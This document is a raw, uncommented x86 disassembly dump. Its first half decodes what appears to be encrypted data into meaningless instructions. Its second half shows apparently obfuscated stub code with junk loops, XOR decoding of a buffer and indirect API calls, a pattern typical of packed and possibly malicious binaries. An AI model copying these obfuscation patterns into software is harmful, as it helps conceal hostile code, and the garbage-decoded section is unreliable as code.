  410b6b:	fild   QWORD PTR [edi]
  410b6d:	(bad)  [eax-0x5e]
  410b70:	dec    edi
  410b71:	paddsw mm1,QWORD PTR [ecx+0x3f]
  410b75:	xor    BYTE PTR [edx+0x35],cl
  410b78:	ret    
  410b79:	clc    
  410b7a:	adc    dl,dl
  410b7c:	pusha  
  410b7d:	push   esp
  410b7e:	pop    ebx
  410b7f:	icebp  
  410b80:	push   esi
  410b81:	(bad)  
  410b82:	es or  al,dl
  410b85:	bnd jne 0x410bec
  410b88:	fist   DWORD PTR [edi-0x25]
  410b8b:	cld    
  410b8c:	push   esp
  410b8d:	adc    edx,esp
  410b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b90:	and    al,0xc0
  410b92:	sub    dh,BYTE PTR ds:0x8adc68dc
  410b98:	test   DWORD PTR ds:0xd30a0053,edi
  410b9e:	stos   DWORD PTR es:[edi],eax
  410b9f:	(bad)  
  410ba0:	cmp    DWORD PTR [ebp-0x1ecfd4f5],esi
  410ba6:	add    ecx,DWORD PTR [edx]
  410ba8:	push   edi
  410ba9:	xchg   DWORD PTR [edi+edx*8],ebx
  410bac:	add    cl,BYTE PTR [ebp-0x15]
  410baf:	ror    DWORD PTR [edi+0x4047faa],cl
  410bb5:	adc    DWORD PTR [eax+eax*1],edx
  410bb8:	div    BYTE PTR [ecx+eax*8+0x2e]
  410bbc:	push   edi
  410bbd:	jns    0x410bf0
  410bbf:	pop    ss
  410bc0:	mov    edx,0x312a2860
  410bc5:	(bad)  
  410bc6:	jns    0x410ba8
  410bc8:	sti    
  410bc9:	out    dx,eax
  410bca:	xchg   BYTE PTR [ebx+0x4e],cl
  410bcd:	pusha  
  410bce:	inc    ebx
  410bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bd0:	out    dx,eax
  410bd1:	or     BYTE PTR ds:0xe4a388b9,al
  410bd7:	out    dx,al
  410bd8:	or     cl,dl
  410bda:	mov    dl,0x26
  410bdc:	icebp  
  410bdd:	stos   DWORD PTR es:[edi],eax
  410bde:	das    
  410bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410be0:	jnp    0x410b7c
  410be2:	es loopne 0x410c5a
  410be5:	clc    
  410be6:	inc    edi
  410be7:	inc    esp
  410be8:	adc    ebp,edx
  410bea:	or     edi,DWORD PTR [ebx]
  410bec:	sub    esp,DWORD PTR [edx]
  410bee:	loop   0x410bf8
  410bf0:	data16 stc 
  410bf2:	sub    esi,DWORD PTR [esi-0x7e]
  410bf5:	and    BYTE PTR [ebx+0x5f852533],0xc1
  410bfc:	mov    edx,0x735c081b
  410c01:	lods   al,BYTE PTR ds:[esi]
  410c02:	inc    eax
  410c03:	push   eax
  410c04:	mov    ds:0xfa7fea3b,al
  410c09:	enter  0xe7af,0xba
  410c0d:	jle    0x410c79
  410c0f:	gs loopne 0x410c83
  410c12:	mov    ds:0x5d50e3af,al
  410c17:	lods   eax,DWORD PTR ds:[esi]
  410c18:	mov    edx,0x1dee26f6
  410c1d:	pushf  
  410c1e:	ja     0x410c9e
  410c20:	(bad)  
  410c21:	jb     0x410c92
  410c23:	xor    BYTE PTR [ebp-0x50a3d381],dh
  410c29:	(bad)  
  410c2a:	dec    eax
  410c2b:	mov    bh,0xf8
  410c2d:	mov    ss,WORD PTR [ebx-0x71d8d5b0]
  410c33:	loop   0x410c9a
  410c35:	pop    esi
  410c36:	add    eax,DWORD PTR [ecx]
  410c38:	sub    ch,ch
  410c3a:	gs pop edx
  410c3c:	js     0x410bca
  410c3e:	sub    eax,0x6191f78b
  410c43:	sub    al,BYTE PTR [eax]
  410c45:	mov    edx,0x18136c94
  410c4a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  410c4c:	out    0xa4,eax
  410c4e:	pushf  
  410c4f:	pushf  
  410c50:	sbb    dh,BYTE PTR [ecx+ebp*4+0x25]
  410c54:	dec    ebp
  410c55:	aad    0x3b
  410c57:	rcr    DWORD PTR [edx+0x6f2d904f],cl
  410c5d:	mov    DWORD PTR [eax+0x463ea20b],esi
  410c63:	retf   
  410c64:	(bad)  
  410c65:	cmc    
  410c66:	cmp    edi,edi
  410c68:	sbb    BYTE PTR [ebx+0x3e6aabb9],cl
  410c6e:	xchg   edi,eax
  410c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c70:	test   DWORD PTR [ebx+0x3abc4415],0x11069576
  410c7a:	cmp    eax,0x7d61776
  410c7f:	fs and eax,0x77f90a95
  410c85:	mov    eax,ds:0xff2ecfe5
  410c8a:	rcr    BYTE PTR [edi],0x2c
  410c8d:	mov    dh,0xd3
  410c8f:	in     al,dx
  410c90:	push   ds
  410c91:	das    
  410c92:	stos   BYTE PTR es:[edi],al
  410c93:	je     0x410cf8
  410c95:	sbb    al,0x3f
  410c97:	xchg   edi,eax
  410c98:	scas   eax,DWORD PTR es:[edi]
  410c99:	pop    ebp
  410c9a:	xchg   ecx,esi
  410c9c:	mov    WORD PTR [edi+0x11],gs
  410c9f:	cmp    al,0xbf
  410ca1:	dec    edx
  410ca2:	add    ebp,ecx
  410ca4:	inc    eax
  410ca5:	cmp    al,0xb3
  410ca7:	or     DWORD PTR [ecx-0x4b],esp
  410caa:	pop    DWORD PTR [edi-0x4a]
  410cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cae:	lods   al,BYTE PTR ds:[esi]
  410caf:	stos   BYTE PTR es:[edi],al
  410cb0:	in     al,dx
  410cb1:	test   BYTE PTR [ebp+0x451c5800],al
  410cb7:	xchg   DWORD PTR [esi+0x40],ecx
  410cba:	arpl   di,bp
  410cbc:	pop    es
  410cbd:	sub    al,0x7b
  410cbf:	push   0x92021eaf
  410cc4:	dec    eax
  410cc5:	sbb    eax,0xdcece3e5
  410cca:	inc    ebx
  410ccb:	lods   al,BYTE PTR ds:[esi]
  410ccc:	add    BYTE PTR ss:[edi+0x7],bh
  410cd0:	cmp    DWORD PTR [edx+0x19],ecx
  410cd3:	jne    0x410cd2
  410cd5:	call   0x1040c7e9
  410cda:	hlt    
  410cdb:	add    eax,0xe0b7ed30
  410ce0:	std    
  410ce1:	mov    al,0x68
  410ce3:	in     eax,0x29
  410ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ce6:	sbb    eax,0xcaf1ff1c
  410ceb:	pop    esi
  410cec:	pop    edx
  410ced:	enter  0xd2c6,0xf1
  410cf1:	mov    ecx,0xc94797b5
  410cf6:	cmp    esp,esp
  410cf8:	aas    
  410cf9:	cmp    DWORD PTR [esi],edi
  410cfb:	dec    ecx
  410cfc:	jae    0x410d2c
  410cfe:	sub    BYTE PTR [edx-0x12],ah
  410d01:	jg     0x410d41
  410d03:	mul    ecx
  410d05:	push   ds
  410d06:	xchg   edx,eax
  410d07:	push   ebp
  410d08:	mov    bl,BYTE PTR [edi+0x19]
  410d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d0c:	aam    0xc7
  410d0e:	aaa    
  410d0f:	fstp   TBYTE PTR cs:[esi+0x5f]
  410d13:	jbe    0x410d5c
  410d15:	les    esp,FWORD PTR [ebx]
  410d17:	sub    ch,0x59
  410d1a:	fldcw  WORD PTR [esp+ecx*1+0x2ec32102]
  410d21:	addr16 dec ebp
  410d23:	(bad)  [ecx]
  410d25:	or     eax,0xe1c16cf1
  410d2a:	aam    0x20
  410d2c:	inc    esi
  410d2d:	xlat   BYTE PTR ds:[ebx]
  410d2e:	imul   DWORD PTR [edx-0x43]
  410d31:	(bad)  
  410d32:	adc    ecx,DWORD PTR [ebp-0x7e6b59db]
  410d38:	push   edi
  410d39:	icebp  
  410d3a:	mov    bl,0x78
  410d3c:	sub    eax,0x8d870b61
  410d41:	rcr    BYTE PTR [ecx+0x7f07c631],cl
  410d47:	cmp    BYTE PTR [ebx+0x3d],bh
  410d4a:	mov    al,0xfe
  410d4c:	mov    ch,0xda
  410d4e:	jns    0x410d2f
  410d50:	scas   al,BYTE PTR es:[edi]
  410d51:	std    
  410d52:	and    al,0x54
  410d54:	dec    esi
  410d55:	or     dh,al
  410d57:	mov    al,0xf4
  410d59:	push   esp
  410d5a:	mov    dh,0xe
  410d5c:	add    dl,BYTE PTR ds:0xad94a4e7
  410d62:	push   ds
  410d63:	pop    es
  410d64:	mov    ds:0x8b95df91,eax
  410d69:	adc    al,0xa6
  410d6b:	fmul   QWORD PTR [edi-0x7b]
  410d6e:	mov    cl,0x46
  410d70:	shl    BYTE PTR [ebx+0x4b],cl
  410d73:	and    al,0x67
  410d75:	or     bh,BYTE PTR [ecx+0x2e89166a]
  410d7b:	cmp    al,0xe8
  410d7d:	xchg   esp,eax
  410d7e:	add    BYTE PTR [esi-0x15],ah
  410d81:	add    al,0xd9
  410d83:	sbb    cl,BYTE PTR [ebp-0x5f]
  410d86:	jl     0x410d47
  410d88:	fnstsw WORD PTR [ebp-0x1]
  410d8b:	bswap  ebp
  410d8d:	jbe    0x410d48
  410d8f:	or     eax,0xff76f9fa
  410d94:	pop    ebp
  410d95:	xlat   BYTE PTR ds:[ebx]
  410d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d97:	inc    esi
  410d98:	xchg   esi,eax
  410d99:	div    BYTE PTR [eax-0x18ffa229]
  410d9f:	jle    0x410df1
  410da1:	mov    edx,0xffaa518f
  410da6:	ret    0x1e32
  410da9:	in     al,dx
  410daa:	(bad)  
  410dab:	into   
  410dac:	lds    esi,FWORD PTR [eax+ebp*4-0x47]
  410db0:	sub    al,BYTE PTR [edx+0x17c57a9e]
  410db6:	(bad)  
  410db7:	aas    
  410db8:	icebp  
  410db9:	imul   esp,edx,0x86d6dc01
  410dbf:	mov    esp,0xed66102b
  410dc4:	(bad)  
  410dc5:	loopne 0x410dad
  410dc7:	cld    
  410dc8:	mov    ah,0x62
  410dca:	(bad)  
  410dcc:	inc    edi
  410dcd:	leave  
  410dce:	in     eax,dx
  410dcf:	inc    esi
  410dd0:	out    dx,eax
  410dd1:	adc    eax,0xb39ea64c
  410dd6:	adc    edi,esp
  410dd8:	sahf   
  410dd9:	and    DWORD PTR [edi+0x4852324c],0xffffffd7
  410de0:	sub    BYTE PTR [edx+0x77],al
  410de3:	aas    
  410de4:	loopne 0x410df7
  410de6:	cmp    ebp,esi
  410de8:	lahf   
  410de9:	push   cs
  410dea:	adc    al,0xe6
  410dec:	test   BYTE PTR [edx],cl
  410dee:	mov    ah,0xa0
  410df0:	pop    ds
  410df1:	inc    eax
  410df2:	enter  0x4946,0xf6
  410df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410df7:	fisub  WORD PTR [ebp-0x5f]
  410dfa:	(bad)  
  410dfb:	fstp   DWORD PTR [edx]
  410dfd:	or     al,0x59
  410dff:	xchg   edi,eax
  410e00:	aaa    
  410e01:	not    DWORD PTR [esi+0x24]
  410e04:	add    dh,BYTE PTR [esi]
  410e06:	std    
  410e07:	xchg   esi,eax
  410e08:	sbb    edi,DWORD PTR [edx-0x69]
  410e0b:	fldenv [eax]
  410e0d:	or     al,0x83
  410e0f:	ret    
  410e10:	nop
  410e11:	std    
  410e12:	mov    edi,0x3c2a0410
  410e17:	cwde   
  410e18:	jg     0x410daf
  410e1a:	xchg   edx,eax
  410e1b:	(bad)  
  410e1c:	clc    
  410e1d:	cmp    DWORD PTR [ecx],edi
  410e1f:	lahf   
  410e20:	mov    al,0x4d
  410e22:	push   eax
  410e23:	sub    DWORD PTR [ebx],0x3fbf4a02
  410e29:	cmp    ecx,esi
  410e2b:	add    al,0x7e
  410e2d:	retf   
  410e2e:	jmp    0xb6f1:0xcadfab69
  410e35:	repnz mov cl,ah
  410e38:	pop    esp
  410e39:	inc    ebp
  410e3a:	and    ebx,DWORD PTR ds:0x2b72504
  410e40:	int3   
  410e41:	xor    esi,DWORD PTR [ecx-0x130e8eb3]
  410e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e48:	cmp    eax,0xc1119b17
  410e4d:	aad    0xe9
  410e4f:	and    DWORD PTR [esi],edx
  410e51:	jnp    0x410e6e
  410e53:	or     cl,bh
  410e55:	inc    edx
  410e56:	push   esi
  410e57:	or     eax,0xffffffc4
  410e5a:	push   ss
  410e5b:	xor    DWORD PTR [edi+ebx*1],edx
  410e5e:	and    cl,BYTE PTR [ebx+0x418e0978]
  410e64:	(bad)  
  410e65:	addr16 jnp 0x410e3d
  410e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e69:	inc    esi
  410e6a:	sbb    esp,DWORD PTR [eax+0x6d]
  410e6d:	push   cs
  410e6e:	xor    dh,al
  410e70:	mov    esi,0x9f6afb78
  410e75:	cmp    BYTE PTR [eax-0x6e],0xe2
  410e79:	lods   eax,DWORD PTR ds:[esi]
  410e7a:	push   es
  410e7b:	mov    edx,0x1333a5a4
  410e80:	or     BYTE PTR [edi],bl
  410e82:	xchg   DWORD PTR [edi+0x723e1b1f],eax
  410e88:	clc    
  410e89:	sbb    BYTE PTR [ebx],0xe
  410e8c:	aad    0x12
  410e8e:	push   ss
  410e8f:	out    dx,al
  410e90:	pop    esp
  410e91:	in     al,dx
  410e92:	stos   BYTE PTR es:[edi],al
  410e93:	loop   0x410e1c
  410e95:	out    dx,al
  410e96:	in     al,dx
  410e97:	dec    esp
  410e98:	adc    al,BYTE PTR [ecx+0x23181c84]
  410e9e:	mov    al,0x69
  410ea0:	fdivr  st(4),st
  410ea2:	jnp    0x410ed4
  410ea4:	pop    ds
  410ea5:	es mov bh,0xde
  410ea8:	in     eax,dx
  410ea9:	sub    al,0x53
  410eab:	lea    ebx,[ecx-0x6eb0c7fb]
  410eb1:	test   BYTE PTR [edx-0x2c],ch
  410eb4:	xor    bl,BYTE PTR [ebp+0x52]
  410eb7:	add    eax,0x3bf26c7a
  410ebc:	push   0x90788eb3
  410ec1:	pusha  
  410ec2:	aas    
  410ec3:	in     al,dx
  410ec4:	xchg   BYTE PTR [ebp-0x2e482ed2],dh
  410eca:	loopne 0x410f09
  410ecc:	mov    al,ds:0x5425f9e5
  410ed1:	pop    es
  410ed2:	stos   BYTE PTR es:[edi],al
  410ed3:	ret    0xf2f1
  410ed6:	mov    al,0x28
  410ed8:	sti    
  410ed9:	out    dx,eax
  410eda:	mov    bl,0x68
  410edc:	mov    ch,0x72
  410ede:	xor    edx,DWORD PTR [esi]
  410ee0:	or     eax,0x88587e48
  410ee5:	mov    esp,0x832c8455
  410eea:	nop
  410eeb:	int3   
  410eec:	jno    0x410f0d
  410eee:	push   ebp
  410eef:	adc    al,cl
  410ef1:	pop    ds
  410ef2:	ret    
  410ef3:	hlt    
  410ef4:	jnp    0x410efd
  410ef6:	arpl   WORD PTR [eax],dx
  410ef8:	rcl    BYTE PTR [edx+0x15461c13],0x57
  410eff:	cmp    bl,cl
  410f01:	ret    0x19f0
  410f04:	sub    DWORD PTR [eax-0x36047ecc],0xae6503ae
  410f0e:	test   DWORD PTR [edx-0x703398fe],esi
  410f14:	or     edx,DWORD PTR [edi-0x49b8f77]
  410f1a:	and    al,0xa0
  410f1c:	inc    eax
  410f1d:	push   ss
  410f1e:	dec    edi
  410f1f:	sbb    eax,ebx
  410f21:	outs   dx,DWORD PTR ds:[esi]
  410f22:	fwait
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	int    0x50
  410f26:	cwde   
  410f27:	es (bad) 
  410f29:	shl    BYTE PTR [esi],cl
  410f2b:	or     al,0x96
  410f2d:	adc    esp,ebp
  410f2f:	sbb    al,0xc7
  410f31:	sbb    BYTE PTR [eax],ch
  410f33:	dec    esi
  410f34:	repnz out dx,eax
  410f36:	mov    esp,0x5191038a
  410f3b:	cdq    
  410f3c:	je     0x410ee7
  410f3e:	fxch   st(6)
  410f40:	cmp    al,BYTE PTR [ecx]
  410f42:	dec    ebp
  410f43:	sti    
  410f44:	jns    0x410f34
  410f46:	mul    DWORD PTR [ebx]
  410f48:	loop   0x410fa2
  410f4a:	(bad)  
  410f4b:	mov    edx,0x8dc0582f
  410f50:	sbb    BYTE PTR [esi],0x4e
  410f53:	xor    al,0xa2
  410f55:	ficomp WORD PTR [eax+0x7b65b2f9]
  410f5b:	stc    
  410f5c:	adc    BYTE PTR [ecx-0x732d3e1b],bh
  410f62:	cmp    BYTE PTR [eax],0xd
  410f65:	(bad)  
  410f66:	xor    bl,BYTE PTR [ecx-0x7da63b0a]
  410f6c:	dec    esi
  410f6d:	repnz mov ds:0x10cd3dcb,al
  410f73:	and    al,BYTE PTR [ebp*1-0x1b8489c]
  410f7a:	cmp    eax,0x9a692d48
  410f7f:	pushf  
  410f80:	xor    BYTE PTR ds:0x71f0b5de,dh
  410f86:	in     al,0x10
  410f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f89:	outs   dx,DWORD PTR ds:[esi]
  410f8a:	outs   dx,DWORD PTR ds:[esi]
  410f8b:	mov    edx,0xc338f31
  410f90:	xlat   BYTE PTR ds:[ebx]
  410f91:	leave  
  410f92:	or     bl,BYTE PTR [ebx+0x15]
  410f95:	jns    0x410f5d
  410f97:	sub    BYTE PTR [edx-0x581e3f2],al
  410f9d:	fwait
  410f9e:	jno    0x410f4d
  410fa0:	mov    cl,0x16
  410fa2:	mov    edx,0x651056d0
  410fa7:	repnz cmc 
  410fa9:	nop
  410faa:	rol    DWORD PTR [esi+0x74],1
  410fad:	mov    ecx,0x688cf46
  410fb2:	push   cs
  410fb3:	sub    eax,0x47eb4cf3
  410fb8:	cmp    BYTE PTR [ecx],dh
  410fba:	push   ecx
  410fbb:	xor    edx,DWORD PTR [esi+0x79]
  410fbe:	sub    ah,ah
  410fc0:	in     al,0xa7
  410fc2:	and    BYTE PTR [eax],0xb5
  410fc5:	adc    eax,0x67db32d7
  410fca:	pop    ebp
  410fcb:	addr16 xchg ecx,eax
  410fcd:	shl    eax,cl
  410fcf:	dec    esp
  410fd0:	repnz call 0x8c45:0xc00aee3d
  410fd8:	retf   0x4126
  410fdb:	outs   dx,BYTE PTR ds:[esi]
  410fdc:	inc    ebx
  410fdd:	jo     0x410fd5
  410fdf:	in     al,dx
  410fe0:	rol    bl,0x7a
  410fe3:	pop    ss
  410fe4:	scas   al,BYTE PTR es:[edi]
  410fe5:	inc    edx
  410fe6:	push   ds
  410fe7:	jns    0x411041
  410fe9:	(bad)  
  410fea:	call   0xe142259
  410fef:	ja     0x410fb4
  410ff1:	repz ret 
  410ff3:	ins    DWORD PTR es:[edi],dx
  410ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ff5:	pop    edx
  410ff6:	xor    ebx,ebp
  410ff8:	mov    esi,0xb0080953
  410ffd:	sub    BYTE PTR [edx+0x6460843b],dl
  411003:	sbb    eax,0x9361ab1e
  411008:	lods   al,BYTE PTR ds:[esi]
  411009:	jge    0x41106d
  41100b:	je     0x410ffe
  41100d:	adc    al,0x0
  41100f:	sbb    ah,dh
  411011:	not    DWORD PTR [eax]
  411013:	lds    ebx,FWORD PTR [ecx-0x36493145]
  411019:	push   0x1521a822
  41101e:	xlat   BYTE PTR ds:[ebx]
  41101f:	lock popa 
  411021:	cmp    bh,BYTE PTR [ecx]
  411023:	inc    esi
  411024:	mov    ecx,DWORD PTR [ebp+0x8]
  411027:	mov    eax,0x8a8d
  41102c:	xor    ax,WORD PTR [ecx+0x20]
  411030:	adc    DWORD PTR ds:0x42b000,0x1520
  41103a:	mov    ecx,0x3b51
  41103f:	or     DWORD PTR ds:0x42a008,0x52f2
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
